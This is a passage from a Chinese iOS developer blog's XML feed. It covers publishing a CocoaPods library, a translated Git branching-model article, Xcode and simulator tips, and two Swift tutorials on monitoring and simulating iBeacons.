"库发布者" =&gt; "邮箱" &#125; s.social_media_url = "https://sevencho.github.io" // 你的个人网页，如果有的话 # ――― Platform Specifics ――――――――――――――――――――――――――――――――――――――――――――――――――――――― # # s.platform = :ios s.platform = :ios, "8.0" # 平台及支持的最低版本 # ――― Source Location ―――――――――――――――――――――――――――――――――――――――――――――――――――――――――― # s.source = &#123; :git =&gt; "https://github.com/SevenCho/XSSecurityCodeButton.git", :tag =&gt; "#&#123;s.version&#125;" &#125; # 你的仓库地址，不能用SSH地址 # ――― Source Code ―――――――――――――――――――――――――――――――――――――――――――――――――――――――――――――― # s.source_files = "XSSecurityCodeButton", "XSSecurityCodeButton/**/*.&#123;h,m&#125;" # 你代码的位置， XSSecurityCodeButton/*.&#123;h,m&#125; 表示 XSSecurityCodeButton 文件夹下所有的.h和.m文件 # s.exclude_files = "Classes/Exclude" # 可执行文件 # s.public_header_files = "Classes/**/*.h" # 公共头文件 # ――― Resources ―――――――――――――――――――――――――――――――――――――――――――――――――――――――――――――――― # # s.resource = "icon.png" # 注意：如果你的代码里包含xib文件，xib属于资源文件，需要resource引入。 # s.resources = "Resources/*.png" # s.preserve_paths = "FilesToSave", "MoreFilesToSave" # ――― Project Linking ―――――――――――――――――――――――――――――――――――――――――――――――――――――――――― # # s.framework = "SomeFramework" s.frameworks = "UIKit", "Foundation" # 支持的框架 # s.library = "iconv" # s.libraries = "iconv", "xml2" # ――― Project Settings ――――――――――――――――――――――――――――――――――――――――――――――――――――――――― # s.requires_arc = true # 需要ARC支持 # s.xcconfig = &#123; "HEADER_SEARCH_PATHS" =&gt; "$(SDKROOT)/usr/include/libxml2" &#125; # s.dependency "JSONKit", "~&gt; 1.4"end 验证 .podspec 文件的格式是否正确 创建完成.podspec文件并按照上面配置完成，接下来我们就需要文件内容及格式是否正确。 终端执行如下指令： 1pod lib lint 验证通过就会输入如下信息 1XSSecurityCodeButton passed validation. 如果你的项目源码被验证出有警告信息，会输出含有如下内容的信息 1(but you can use `--allow-warnings` to ignore them). 此时你只需要在验证指令后面加上对应的提示，重新验证一遍 1pod lib lint --allow-warnings 给仓库打标签 验证成功后，就需要将仓库提交到远程，然后给仓库打上标签并将标签也推送到远程。 标签相当于是你的仓库的一个压缩包，用于稳定存储当前版本。 标签号与你在 s.version = “0.0.1”的版本号一致0.0.1 1234// 创建标签git tag -a 0.0.1 -m &apos;标签说明&apos; // 推送到远程git push origin --tags 发布.podspec 发布项目的描述的文件, 在项目根目录下执行 1pod trunk push XSSecurityCodeButton.podspec 这一步会执行如下操作： 更新本地 pods 库 ~/.cocoaPods.repo/master 验证.podspec格式是否正确-.podspec 文件转成 JSON 格式 对master仓库 进行合并，提交.master仓库地址 发布成功后输入如下内容： 12345678Updating spec repo `master`-------------------------------------------------------------------------------- 🎉 Congrats 🚀 XSSecurityCodeButton (0.0.1) successfully published 📅 June 26th, 04:13 🌎 https://cocoapods.org/pods/XSSecurityCodeButton // 你发布的cocoapods仓库信息，可在浏览器打开查看 👍 Tell your friends! 使用仓库 先更新本地pods仓库信息 更新完成本地仓库后就可以搜索使用我们自己发布的cocoapods仓库了 就可以在需要的项目的Podfile添加、使用自己的仓库了 123pod setup // 更新pod search XSSecurityCodeButton // 搜索pod &apos;XSSecurityCodeButton&apos;, &apos;~&gt; 0.0.1&apos; // 需要使用的项目的Podfile文件中添加后安装，和使用其他三方库一样 更新维护 当我们维护修改了我们的源码文件后就需要重新发布一个新的版本到cocoapods 项目源码打上对应的标签推送到自己的远程仓库 更新XSSecurityCodeButton.podspec中版本号（和新的标签一致） 重新执行pod trunk push XSSecurityCodeButton.podspec --allow-warnings推送发布到pods仓库]]></content>
      <categories>
        <category>iOS</category>
      </categories>
      <tags>
        <tag>iOS</tag>
        <tag>CocoaPods</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[一个成功的分支模型]]></title>
    <url>%2Farchives%2F33f710d8.html</url>
    <content type="text"><![CDATA[我是个俗气至顶的人，见山是山，见海是海，见花便是花。唯独见了你，云海开始翻涌，江潮开始澎湃，昆虫的小触须挠着全世界的痒。你无需开口，我和天地万物便通通奔向你。——王小波《爱你就像爱生命》 前言 本文翻译自“A successful Git branching model” 英文原文请点击此处查看 正文 在这篇文章中，我将展示我一年前曾经介绍过的用于我部分项目（无论是在工作还是私人）的开发模式，并且已经证明是非常成功的。我有写这篇文章的打算已经很久了，但直到今天我才有时间彻底的完成它。我不会谈论关于项目的任何细节，仅仅讨论关于分支策略和发布管理。 为什么git？ 关于专业人士的全面讨论以及Git和集中的源代码控制系统的利弊比较，请看这里。那是一个充满了硝烟的战场。作为开发人员，如今我喜欢Git要远超其他工具。Git真正的改变了开发人员想要合并和构建分支的方式。我从经典的CVS / Subversion世界一路走来，合并/分支一直被认为是一个可怕的（“合并冲突要小心，他们会咬你！”）而且这些事你仅仅偶尔做一次。 但是使用Git，这些操作非常简洁和高效，它们也被称作日常工作流程的核心部分之一。例如，在CVS / Subversion 书籍中，分支和合并将在后面的章节（高级用户）中优先讨论，而在 每一本 Git 书中，它已经在第3章（基础知识）中讨论过。 由于其简单性和重复性，分支和合并不再是令人害怕的事情。版本控制工具可以帮助快速的进行分支/合并。 工具到此为止，让我们来看看开发模型。我在这里展示的模型本质上只是一系列的步骤，每个团队成员都必须遵循这些过程来实现可管理的软件开发过程。 分散但集中 我们使用的，且与这个分支模型配合良好的仓库，他有一个“真正”的中央仓库。注意，这个库只是被认为是中央仓库(因为Git是一个分布式的版本控制工具，在技术层面没有所谓的中央仓库)。我们将会为这个仓库起名为origin，因为所有的Git用户对这个名字都比较熟悉。 每个开发者从origin拉取和推送代码。除了集中式的推送拉取外，每个开发者也可以从别的开发者处拉取代码，组成一个子团队。例如当与两个或者更多的人开发一个大的功能时，在将代码推送到origin之前，这种代码管理模式将非常有用。在上图中，存在Alice和Bob，Alice和David，Clair和David三个子团队。 技术上而言，这只不过意味着Alice定义了一个远程Git仓库，起名为bob，实际上指向Bob的版本库，反之亦然(Bob定义了一个远程Git仓库，起名为alice，实际上指向Alice的版本库)。 主分支 在核心地方，当前开发模型受到了已存在模型的很大启发。集中式的版本库有两个永久存在的主分支： master分支 develop分支 origin的master分支每个Git用户都很熟悉。平行的另外一个分支叫做develop分支。 我们认为origin/master这个分支上HEAD引用所指向的代码都是可发布的。 我们认为origin/develop这个分支上HEAD引用所指向的代码总是反应了下一个版本所要交付功能的最新的代码变更。一些人管它叫“整合分支”。它也是自动构建系统执行构建命令的分支。 当develop分支上的代码达到了一个稳定状态，并且准备发布时，所有的代码变更都应该合并到master分支，然后打上发布版本号的tag。具体如何进行这些操作，我们将会讨论 因此，每次代码合并到master分支时，它就是一个人为定义的新的发布产品。理论上来讲，在这里我们应该非常严格，当master分支有新的提交时，我们应该使用Git的钩子脚本执行自动构建命令，然后将软件推送到生产环境的服务器中进行发布。 辅助性分支 紧邻master和develop分支，我们的开发模型采用了另外一种辅助性的分支，以帮助团队成员间的并行开发，特性的简单跟踪，产品的发布准备事宜，以及快速的解决线上问题。不同于主分支，这些辅助性分支往往只要有限的生命周期，因为他们最终会被删除。 我们使用的不同类型分支包括: 特性分支 Release分支 Hotfix 分支 上述的每一个分支都有其特殊目的，也绑定了严格的规则：哪些分支是自己的拉取分支，哪些分支是自己的目标合并分支。 从技术角度看，这些分支的特殊性没有更多的含义。只是按照我们的使用方式对这些分支进行了归类。他们依旧是原Git分支的样子。 功能分支 功能分支可以从develop分支拉取建立，最终必须合并会develop分支。特性分支的命名，除了 master， develop， release-*，或hotfix-*以外，可以随便起名。 功能分支(有时候也成主题分支)用于开发未来某个版本新的特性。当开始一个新特性的开发时，这个特性未来将发布于哪个目标版本，此刻我们是不得而知的。功能分支的本质特征就是只要特性还在开发，他就应该存在，但最终这些功能分支会被合并到develop分支(目的是在新版本中添加新的功能)或者被丢弃(它只是一个令人失望的试验) 功能分支只存在开发者本地版本库，不在远程版本库。 创建功能分支 当开始开发一个新功能时，从develop分支中创建功能分支 12$ git checkout -b myfeature developSwitched to a new branch &quot;myfeature&quot; 在develop分支整合已经开发完成的功能 开发完成的功能必须合并到develop分支，即添加到即将发布的版本中。 12345678$ git checkout developSwitched to branch &apos;develop&apos;$ git merge --no-ff myfeatureUpdating ea1b82a..05e9557(Summary of changes)$ git branch -d myfeatureDeleted branch myfeature (was 05e9557).$ git push origin develop --no-ff参数的作用是在合并的时候，会创建一个新的提交对象，即使是fast-forward方式的合并。这就避免了丢失功能分支的历史记录信息以及提交记录信息。比较一下 在后面的例子中，是不可能从Git历史记录中看到一个已经实现了的功能的所有提交对象-除非你去查看所有的日志信息。要想获取整个功能分支信息，在右面的例子中的确是一个头疼的问题，但是如果使用--no-ff参数就没有这个问题。 使用这个参数后，的确创建了一些新的提交对象(那怕是空提交对象)，但是很值得。 不幸的是，我还没有找到一种方法使Git默认的merge操作带着--no-ff参数，但的确应该这样。 发布分支 从develop分支去建立Release分支，Release分支必须合并到develop分支和master分支，Release分支名可以这样起名:release-*。 Release分支用于支持一个新版本的发布。他们允许在最后时刻进行一些小修小改。甚至允许进行一些小bug的修改，为新版本的发布准要一些元数据(版本号，构建时间等)。通过在release分支完成这些工作，develop分支将会合并这些特性以备下一个大版本的发布。 从develop分支拉取新的release分支的时间点是当开发工作已经达到了新版本的期望值。至少在这个时间点，下一版本准备发布的所有目标特性必须已经合并到了develop分支。更远版本的目标特性不必合并会develop分支。这些特性必须等到个性分支创建后，才能合并回develop分支 在release分支创建好后，就会获取到一个分配好即将发布的版本号，不能更早，就在这个时间点。在此之前，develop分支代码反应出了下一版本的代码变更，但是到底下一版本是 0.3 还是 1.0，不是很明确，直到release分支被建立后一切都确定了。这些决定在release分支开始建立，项目版本号等项目规则出来后就会做出。 创建release分支 从develop分支创建release分支。例如1.1.5版本是当前产品的发布版本，我们即将发布一个更大的版本。develop分支此时已经为下一版本准备好了，我们决定下一版的版本号是1.2(1.1.6或者2.0也可以)。所以我们创建release分支，并给分支赋予新的版本号: 1234567$ git checkout -b release-1.2 developSwitched to a new branch &quot;release-1.2&quot;$ ./bump-version.sh 1.2Files modified successfully, version bumped to 1.2.$ git commit -a -m &quot;Bumped version number to 1.2&quot;[release-1.2 74d9424] Bumped version number to 1.21 files changed, 1 insertions(+), 1 deletions(-) 创建好分支并切到这个分支后，我们给分支打上版本号。bump-version.sh是一个虚构的shell脚本，它更改了工作空间的某些文件来反映新版本特征。(当然也可以手动改变这些文件)，然后版本就被提交了。 新的分支会存在一段时间，直到新版本最终发布。在这段时间里，bug的解决可以在这个分支进行(不要在develop分支进行)。此时是严禁添加新的大特性。这些修改必须合并回develop分支，之后就等待新版本的发布。 完成一个release分支 当release分支的准备成为一个真正的发布版本时，一些操作必须需要执行。首先，将release分支合并回master分支(因为master分支的每一次提交都是预先定义好的一个新版本，谨记)。然后为这次提交打tag，为将来去查看历史版本。最后在release分支做的更改也合并到develop分支，这样的话，将来的其他版本也会包含这些已经解决了的bug。 在Git中需要两步完成: 123456$ git checkout masterSwitched to branch &apos;master&apos;$ git merge --no-ff release-1.2Merge made by recursive.(Summary of changes)$ git tag -a 1.2 这样release分支已经完成工作，tag也已经打了。 备注:你可以使用-s or -u 参数为你的tag设置标签签名。 为了保存这些在release分支所做的变更，我们需要将这些变更合并回develop分支。执行如下Git命令: 12345$ git checkout developSwitched to branch &apos;develop&apos;$ git merge --no-ff release-1.2Merge made by recursive.(Summary of changes) 这步有可能会有合并冲突(极有可能，因为我们已经改变了版本号)。如果有冲突，解决掉他，然后提交。 现在我们已经完成了工作，release分支可以删除了，因为我们不在需要他: 12$ git branch -d release-1.2Deleted branch release-1.2 (was ff452fe). Hotfix分支 Hotfix分支从master分支建立，必须合并回develop分支和master分支，为Hotfix分支可以这样起名:hotfix-* Hotfix分支在某种程度上非常像release分支，他们都意味着为某个新版本发布做准备，并且都是预先不可知的。Hotfix分支是基于当前生产环境的产品的一个bug急需解决而必须创建的。当某个版本的产品有一个严重bug需要立即解决，Hotfix分支需要从master分支上该版本对应的tag上进行建立，因为这个tag标记了产品版本 创建hotfix分支 Hotfix分支从master分支进行创建。例如当前线上1.2版本产品因为server端的一个Bug导致系统有问题。但是在develop分支进行更改是不靠谱的，所以我们需要建立hotfix分支，然后开始解决问题: 1234567$ git checkout -b hotfix-1.2.1 masterSwitched to a new branch &quot;hotfix-1.2.1&quot;$ ./bump-version.sh 1.2.1Files modified successfully, version bumped to 1.2.1.$ git commit -a -m &quot;Bumped version number to 1.2.1&quot;[hotfix-1.2.1 41e61bb] Bumped version number to 1.2.11 files changed, 1 insertions(+), 1 deletions(-) 千万别忘记在创建分支后修改版本号。 然后解决掉bug，提交一次或多次。 123$ git commit -m &quot;Fixed severe production problem&quot;[hotfix-1.2.1 abbe5d6] Fixed severe production problem5 files changed, 32 insertions(+), 17 deletions(-) 结束hotfix分支 完成工作后，解决掉的bug代码需要合并回master分支，但同时也需要合并到develop分支，目的是保证在下一版中该bug已经被解决。这多么像release分支啊。 首先，对master分支进行合并更新，然后打tag 123456$ git checkout masterSwitched to branch &apos;master&apos;$ git merge --no-ff hotfix-1.2.1Merge made by recursive.(Summary of changes)$ git tag -a 1.2.1 - 备注:你可以使用-s or -u &lt;key&gt;参数为你的tag设置标签签名。 紧接着，在develop分支合并bugfix代码 12345$ git checkout developSwitched to branch &apos;develop&apos;$ git merge --no-ff hotfix-1.2.1Merge made by recursive.(Summary of changes) 这里可能会有一些异常情况，当一个release分支存在时，hotfix 分支需要合并到release 分支，而不是develop分支。当release分支的使命完成后，合并回release分支的bugfix代码最终也会被合并到develop分支。(当develop分支急需解决这些bug，而等不到release分支的结束，你可以安全的将这些bugfix代码合并到develop分支，这样做也是可以的)。 最后删除这些临时分支 12$ git branch -d hotfix-1.2.1Deleted branch hotfix-1.2.1 (was abbe5d6). 总结 这个分支模型其实没有什么震撼人心的新东西，这篇文章开始的那个“最大图片”已经证明了他在我们工程项目中的巨大作用。它会形成一种优雅的理想模型，而且很容易理解，该模型也允许团队成员形成一个关于分支和版本发布过程的相同理念。 这里有提供一个高质量的分支模型图的PDF版本。去吧，把它挂在墙上随时快速参考。 Git-分支-模型.pdf 更新：任何需要的小伙伴，这里有一个原图的gitflow-model.src.key文件。 参考 A successful Git branching model]]></content>
      <categories>
        <category>iOS</category>
      </categories>
      <tags>
        <tag>iOS</tag>
        <tag>git</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[最佳的iOS开发技巧及小窍门]]></title>
    <url>%2Farchives%2Fed90488b.html</url>
    <content type="text"><![CDATA[我选择沉默的主要原因之一：从话语中，你很少能学到人性，从沉默中却能。假如还想学得更多，那就要继续一声不吭 。——王小波《沉默的大多数》 前言 本文翻译自“Best iOS Development Tips and Tricks” 英文原文请点击此处查看 译者注：文中部分功能涉及到视频演示，视频来源YouTube，需科学上网方可观看。 正文1、如果你想知道项目的确切构建时间，请用下面指令开启Xcode的相关功能。1defaults write com.apple.dt.Xcode ShowBuildOperationDuration -bool YES 2、 提升你Swift项目的构建时间 在Xcode 9.2的发布说明中提到一个可以提升Swift项目构建时间的功能（处于实验阶段），使用buildsystemscheduleinherentlyparallelcommandclutly用户默认值启用。 1defaults write com.apple.dt.Xcode BuildSystemScheduleInherentlyParallelCommandsExclusively -bool NO 提示：根据发布说明这是一个试验阶段的功能，会导致构建阶段内存消耗增加。 3、模拟器和Xcode在全屏模式下共存 能在全屏模式下同时使用Xcode和iOS模拟器，可能是我在Xcode9最喜欢的一个功能。你只需要在终端执行下面的指令开启 1defaults write com.apple.iphonesimulator AllowFullscreenMode -bool YES 如果你想使用更多的模拟器的秘密功能，请开启苹果隐藏的内部菜单栏，你需要在用户根目录创建一个名字为AppleInternal的空文件夹，然后执行下面指令重启模拟器即可。 1sudo mkdir /AppleInternal 新的菜单栏就会出现 4、iOS模拟器录制视频 你可以使用xcrun command-line工具截取模拟屏幕快照或者录制模拟器屏幕视频。 录制视频请执行下面指令 1xcrun simctl io booted recordVideo &lt;文件名&gt;.&lt;文件后缀&gt;. 例如： 1xcrun simctl io booted recordVideo appvideo.mov 快捷键control + c停止视频录制，录制的适配文件默认会在当前目录保存。 5、从Finder共享文件到iOS模拟器 从Xcode9开始，模拟器允许使用Finder扩展直接从Finder窗口共享文件。然而，拖动文件到模拟器放开似乎更加快捷。 然而你也可以使用下面simctl命令做一些和图片/视频文件相似的事情。 1xcrun simctl addmedia booted &lt;PATH TO FILE&gt; 6、使用指纹sudo 如果你想使用指纹作为你Macbook Pro执行sudo时的密码，请编辑/etc/pam.d/sudo文件将下面一行添加在文件上面。 1auth sufficient pam_tid.so 现在你可以使用指纹执行sudo了。 7、使用声音通知调试你的自动布局约束 这将是一个非常好的方式去调试自动布局约束，仅仅在启动的时候传递UIConstraintBasedLayoutPlaySoundOnUnsatisfiable参数，当约束在运行时出现糟糕情况的时候就会播放声音。 1-_UIConstraintBasedLayoutPlaySoundOnUnsatisfiable YES 8、移除Xcode中无效的模拟器 这个小命令将移除Xcode中所有无效的模拟器，所谓无效是指对xcode-select无效的Xcode版本。 1xcrun simctl delete unavailable 你最喜欢的功能是什么？请告诉我。]]></content>
      <categories>
        <category>iOS</category>
      </categories>
      <tags>
        <tag>iOS</tag>
        <tag>xCode</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[iOS蓝牙开发之iBeacon篇(二)]]></title>
    <url>%2Farchives%2Fb05dc691.html</url>
    <content type="text"><![CDATA[那一天我二十一岁，在我一生的黄金时代。我有好多奢望。我想爱，想吃，还想再一瞬间变成天上半明半暗的云。我来我才知道，生活就是个缓慢受锤的过程，人一天天老下去，奢望也一天天消失，最后变得像挨了锤的牛一样。可是我过二十一岁生日时没有预见到这一点。我觉得自己会永远生猛下去，什么也锤不了我。——王小波《黄金时代》 前言 照例，如果只是需要监听iBeacon的demo代码，可以直接点击下载，不需要往下看了😂 如果想了解iBeacon相关信息，请参考iOS蓝牙开发之iBeacon篇(一) 虽然iBeacon也是基于Ble的，从硬件上看也是一套东西，但是Apple公司把他封装成了两套东西，所以在iOS移动端开发来说，这是两个完全不同的东西，调用完全不同框架的api. Apple公司为了省电和隐私限制只能监听指定UUID的iBeacon，无法像安卓一样搜索附近所有的iBeacon信息，虽然iBeacon扫描底层可以获取到附近的所有的iBeacon信息（底层就是获取附近所有的iBeacon然后和当前监听的iBeacon标识对比，然后回调给上层），如果你只是想在你自己的手机上测试下，可以参考AnyiBeacon-iOS这个项目，但是只能作为测试使用，因为涉及到Apple的私有api，是不允许上架App Store的。 想了解iBeacon底层数据协议格式的，可以参考What is the iBeacon Bluetooth Profile 这篇文章。 初始化 在 iOS8.0之后的时候如果想使用iBeacon，必须让用户授权 在info.plist文件里面配置下面的key 123NSLocationAlwaysAndWhenInUseUsageDescription // 推荐NSLocationWhenInUseUsageDescriptionNSLocationAlwaysUsageDescription 在capabilities里面开启Background Modes的 Location updates 由于iBeacon是基于CoreLocation框架的，所以先导入头文件并实例化位置管理者 12import CoreLocationlet locationManager = CLLocationManager() 请求授权并设置代理 12345678override func viewDidLoad()&#123; super.viewDidLoad() // Do any additional setup after loading the view. locationManager.requestAlwaysAuthorization() // 必须要申请权限,否者不会回调扫描到beacons的代理方法 locationManager.delegate = self&#125; 添加需要监听的iBeacon 这个是添加iBeacon信息界面代理回调 123456789101112131415// MARK: AddBeaconextension ItemsViewController: AddBeacon &#123; func addBeacon(item: Item) &#123; items.append(item) tableView.beginUpdates() let newIndexPath = IndexPath(row: items.count - 1, section: 0) tableView.insertRows(at: [newIndexPath], with: .automatic) tableView.endUpdates() startMonitoring(item) // 开始监控 persistItems() // 持久化到本地 &#125;&#125; Item为一个iBeacon信息的数据模型, 即包含如下信息 12345let name: String // 非必须let icon: Int // 非必须let uuid: UUIDlet majorValue: CLBeaconMajorValue // 非必须let minorValue: CLBeaconMinorValue // 非必须 开始监听和停止监听 根据一个iBeacon的参数（iBeacon硬件提供或者自己用iPhone或者mac模拟）初始化一个CLBeaconRegion 两种监听模式 123456789101112func startMonitoring(_ item: Item)&#123; let region = item.asBeaconRegion() locationManager.startMonitoring(for: region) // 低功耗，支持后台监听 locationManager.startRangingBeacons(in: region) // 大功耗，不支持后台监听&#125;// MARK: 根据模型数据初始化一个Beacon Regionfunc asBeaconRegion() -&gt; CLBeaconRegion &#123; return CLBeaconRegion(proximityUUID: uuid, major: majorValue, minor: minorValue, identifier: name)&#125; 如果想停止监听某个iBeacon 123456func stopMonitoring(_ item: Item)&#123; let region = item.asBeaconRegion() locationManager.stopMonitoring(for: region) locationManager.stopRangingBeacons(in: region)&#125; 监听到iBeacon信息回调 开始监听某个Beacon 1234func locationManager(_ manager: CLLocationManager, didStartMonitoringFor region: CLRegion)&#123; print("didStartMonitoringFor\(region)")&#125; 监听到Beacons 12345678910111213141516171819202122232425// MARK: CLLocationManagerDelegateextension ItemsViewController: CLLocationManagerDelegate &#123; func locationManager(_ manager: CLLocationManager, didRangeBeacons beacons: [CLBeacon], in region: CLBeaconRegion) &#123; print("didRangeBeacons \(beacons.count)个") var indexPaths = [IndexPath]() for beacon in beacons &#123; for row in 0..&lt;items.count &#123; // 检测是否是需要监控的beacon if items[row] == beacon &#123; items[row].beacon = beacon indexPaths += [IndexPath(row: row, section: 0)] &#125; &#125; &#125; if let visiblaRows = tableView.indexPathsForVisibleRows &#123; let rowsToUpdate = visiblaRows.filter&#123; indexPaths.contains($0) &#125; for row in rowsToUpdate &#123; // 刷新可见cell上对应的Beacon距离信息 let cell = tableView.cellForRow(at: row) as? ItemCell cell?.refreshLocation() &#125; &#125; &#125; 其他的回调方法 注意： 如果需要监听进入某个区域或者从某个区域离开，则需要在初始化Beacon Region的时候订阅 不然进入和离开区域不回回调 12&gt; region.notifyOnEntry = YES; &gt; region.notifyOnExit = YES; 1234567891011121314151617181920212223// monitoring 监听某个beacon失败 func locationManager(_ manager: CLLocationManager, monitoringDidFailFor region: CLRegion?, withError error: Error)&#123; print("Failed monitoring region\(error.localizedDescription)")&#125;// 位置管理者出现错误信息 func locationManager(_ manager: CLLocationManager, didFailWithError error: Error)&#123; print("Location manager failed \(error.localizedDescription)")&#125;// ranging 监听某个beacon失败 func locationManager(_ manager: CLLocationManager, rangingBeaconsDidFailFor region: CLBeaconRegion, withError error: Error)&#123; print("rangingBeaconsDidFailFor")&#125;// 已经进入到某个区域 func locationManager(_ manager: CLLocationManager, didEnterRegion region: CLRegion) &#123; print("didEnterRegion")&#125;// 已经从某个区域离开 func locationManager(_ manager: CLLocationManager, didExitRegion region: CLRegion) &#123; print("didExitRegion")&#125; 关于推送 app现在能显示iBeacon设备，并且还能实时监控它们的距离。但是当app没有处于运行状态时，如iBeacon设备在宠物猫脖子上但是宠物猫跑丢了！ 此时app就需要在猫离开区域的时候通知用户。 在AppDelegate导入通知框架并初始化一个位置管理者 1234import CoreLocationimport UserNotificationsvar locationManager = CLLocationManager() 程序启动的时候，配置位置监听和设置通知 123456789101112func application(_ application: UIApplication, didFinishLaunchingWithOptions launchOptions: [UIApplicationLaunchOptionsKey: Any]?) -&gt; Bool &#123; // Override point for customization after application launch. // 注册通知，请求权限 let center = UNUserNotificationCenter.current() center.requestAuthorization(options: [.alert, .sound]) &#123; (granted, error) in &#125; // 设置代理 locationManager.delegate = self return true&#125; 监听目标离开区域并发送本地通知 123456789101112131415extension AppDelegate: CLLocationManagerDelegate&#123; func locationManager(_ manager: CLLocationManager, didExitRegion region: CLRegion) &#123; guard region is CLBeaconRegion else &#123; return &#125; let content = UNMutableNotificationContent() content.title = "Forget Me Not" content.body = "Are you forgetting something?" content.sound = .default() let request = UNNotificationRequest(identifier: "iBeaconDemo", content: content, trigger: nil) UNUserNotificationCenter.current().add(request, withCompletionHandler: nil) &#125;&#125; 参考官方文档维基百科iOS 中 iBeacon 开发iBeacon Tutorial with iOS and SwiftHow to detect ibeacon device without knowing UUID in iOS?Detecting beacons via iBeacon Monitoring &amp; Ranging vs CoreBluetooth scanForPeripheralsWithServices]]></content>
      <categories>
        <category>iOS</category>
        <category>蓝牙</category>
      </categories>
      <tags>
        <tag>iOS</tag>
        <tag>蓝牙</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[iOS蓝牙开发之iBeacon篇(一)]]></title>
    <url>%2Farchives%2F1f6c5df3.html</url>
    <content type="text"><![CDATA[高山有崖, 林木有枝。忧来无方, 人莫之知。——曹丕《善哉行》 什么是iBeacon 如果只是需要iPhone模拟iBeacon的demo代码，可以点击下载，不需要往下看了😂 你曾经想过用手机在一个大型建筑物中为自己定位吗，比如购物中心，或者博物馆。 当然，GPS可以让你得知自己身处哪一座建筑物里。但是如果想要在这些钢筋混凝土堆砌而成的建筑中获得精确的GPS信号，只能祝你好运了。你所需要的是内置在建筑物中一些设备，（通过它们）让手机获取确定你的位置。 iBeacon是Apple公司开发的一种近场通讯协议，于2013年的WWDC开发者大会推出。当你的手持设备靠近一个Beacon基站时，设备就能够感应到Beacon信号，范围可以从几毫米到50米。因为是一种定位技术，苹果将iBeacon相关的接口放到了CoreLocation.framework。 其工作方式是: 配备有低功耗蓝牙（BLE）通信功能的设备(iBeacon)使用BLE技术向周围发送自己特有的UUID，使用iBeacon的App接收到该UUID的应用软件会根据该UUID采取一些行动。 iBeacon的应用场景 当使用者走进某个博物馆时，会扫描到一个 beacon。这个 beacon 有三个标志符 proximityUUID 是一个整个博物馆统一的值，可以用来标识这个博物馆 major 值用来标识特定的展馆，比如唐代展馆，汉代展馆等等 minor 值标识了特定的一个位置的 beacon，例如定位到使用者正在唐代展馆的唐三彩展品的位置。 这时博物馆的 app 会被系统唤醒，app 可以运行一个比较短的时间。在这段时间内，app 可以根据 beacon 的属性查询到使用者的地理位置（通过查询服务器或者本地数据） 例如在唐代展馆的唐三彩展品位置，之后就可以通过一个 local notification 推送这件展品的简介。用户可以点击这次 local notification 来查看更详细的信息，这样一次导览行为就完成了。 可以充当iBeacon的iOS的设备 iPhone4s 或者 之后的iPhone设备 第三代iPad或者 之后iPad设备 iPad mini 或者 之后iPad mini设备 第五代iPod touch 或者之后iPod touch设备 iMac 或者 MacBookPro iBeacon监听方式 Monitoring：低功耗监听，用来判断设备进出ibeacon围栏，支持后台或app进程杀掉后监听。 Ranging：大功率监听，监听当前设备所在区域内的ibeacon信息，包括rssi，距离，不支持后台监听。 基于这两个特性，我们在使用时就分为前台和后台两个场景来实现ibeacon的检测。 iBeacon监听 你的设备当然不会自动监测iBeacon的，所以首先你得告知它。CLBeaconRegion类代表一个iBeacon。 iBeacon与Core Location关联在一起看上去有点奇怪，因为它就是一个蓝牙设备而已，但是也可以这么认为，那就是iBeacon提供小范围定位功能，而GPS提供的是大范围定位功能。 CLBeaconRegion参数介绍 参数 必要字段 作用 identifier 是 标识字符串 proximityUUID 是 一级标识（eg.标识公司） major 否 二级标识（eg.标识店铺） minor 否 三级标识（eg.标识位置） 手机模拟iBeacon 当想让iOS设备充当iBeacon时，你还需要引入Core Bluetooth框架，但只想检测iBeacon设备，你只需要Core Location就行了。 初始化 初始化配置一个iBeacon的参数 beaconUUID 是一个128位的值，可以使用uuidgen生成，但是生成的某些值不可用，推荐使用我提供的这个 初始化一个蓝牙外设管理者， 12345678910111213private let beaconIdentity = "kitty"private let beaconUUID = "B0702880-A295-A8AB-F734-031A98A512DE"private let beaconMajorValue = UInt16(2)private let beaconMinorValue = UInt16(7)private var peripheraManager: CBPeripheralManager?override func viewDidLoad() &#123; super.viewDidLoad() // Do any additional setup after loading the view, typically from a nib. peripheraManager = CBPeripheralManager(delegate: self, queue: .main)&#125; 监听蓝牙状态改变 在inof.plist文件配置Privacy - Bluetooth Peripheral Usage Description请求蓝牙授权 遵守CBPeripheralManagerDelegate协议 123456789101112131415161718192021extension ViewController: CBPeripheralManagerDelegate&#123; func peripheralManagerDidUpdateState(_ peripheral: CBPeripheralManager) &#123; switch peripheral.state &#123; case .unknown: print("蓝牙未知的") case .resetting: print("蓝牙重置中") case .unsupported: print("蓝牙不支持") case .unauthorized: print("蓝牙未验证") case .poweredOff: print("蓝牙未启动") case .poweredOn: print("蓝牙可用") beaconAdvertising() &#125; &#125;&#125; 配置模拟iBeacon广播数据1234567891011func beaconAdvertising() &#123; guard let uuid = UUID(uuidString: beaconUUID) else &#123; return &#125; let region = CLBeaconRegion(proximityUUID: uuid, major: beaconMajorValue, minor: beaconMinorValue, identifier: beaconIdentity) let regionData = region.peripheralData(withMeasuredPower: nil) let regionAdvertising = regionData as? [String : Any] peripheraManager?.startAdvertising(regionAdvertising) print("开始模拟Beacon广播数据\(regionData)")&#125; 监听是否广播成功 若广播成功，则可作为iBeacon使用 需要监听iBeacon可参考iOS蓝牙开发之iBeacon篇(二) 12345func peripheralManagerDidStartAdvertising(_ peripheral: CBPeripheralManager, error: Error?) &#123; print("正在模拟Beacon广播数据: \(peripheral.isAdvertising) --- 错误信息: \(String(error?.localizedDescription ?? "无"))") stateLbl.text = "正在模拟Beacon广播数据: \n\(peripheral.isAdvertising) \n错误信息: \n\(String(error?.localizedDescription ?? "无"))" stateLbl.textAlignment = .center&#125; 参考官方文档维基百科iOS 中 iBeacon 开发]]></content>
      <categories>
        <category>iOS</category>
        <category>蓝牙</category>
      </categories>
      <tags>
        <tag>iOS</tag>
        <tag>蓝牙</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[iOS开发之地图篇(三):历史轨迹记录]]></title>
    <url>%2Farchives%2Fb47045de.html</url>
